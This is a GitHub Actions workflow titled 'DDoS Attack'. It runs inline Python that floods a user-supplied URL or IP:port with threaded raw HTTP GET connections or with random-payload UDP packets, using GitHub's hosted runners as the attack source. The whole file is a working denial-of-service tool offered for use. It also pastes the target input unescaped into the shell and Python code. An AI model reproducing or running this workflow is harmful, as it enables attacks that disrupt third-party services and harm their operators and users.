name: "🔥 DDoS Attack"
on:
  workflow_dispatch:
    inputs:
      target:
        description: "🎯 Target (URL or IP:Port)"
        required: true
        default: "httpbin.org"
      mode:
        description: "🔧 Attack Mode"
        required: true
        default: "http"
        type: choice
        options:
          - http
          - udp

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: "🚀 Start Attack"
        run: |
          echo "Target: ${{ github.event.inputs.target }}"
          echo "Mode: ${{ github.event.inputs.mode }}"
          
          if [ "${{ github.event.inputs.mode }}" = "http" ]; then
            # HTTP ATTACK
            python3 -c "
import socket
import threading
import time

target = '${{ github.event.inputs.target }}'
if '://' in target:
    target = target.split('://')[1]
host = target.split(':')[0] if ':' in target else target
port = int(target.split(':')[1]) if ':' in target else 80

print(f'HTTP Flood: {host}:{port}')

count = 0

def attack():
    global count
    for _ in range(50):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((host, port))
            s.send(b'GET / HTTP/1.1\\r\\n\\r\\n')
            s.close()
            count += 1
        except:
            pass

threads = []
for i in range(30):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f'✅ HTTP Attack Complete: {count} requests')
            "
          else
            # UDP ATTACK
            python3 -c "
import socket
import threading
import time
import os

target = '${{ github.event.inputs.target }}'
if ':' in target:
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
else:
    ip = target
    port = 80

print(f'UDP Flood: {ip}:{port}')

count = 0

def attack():
    global count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(100):
        try:
            sock.sendto(os.urandom(1024), (ip, port))
            count += 1
        except:
            pass
    sock.close()

threads = []
for i in range(50):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f'✅ UDP Attack Complete: {count} packets')
            "
          fi
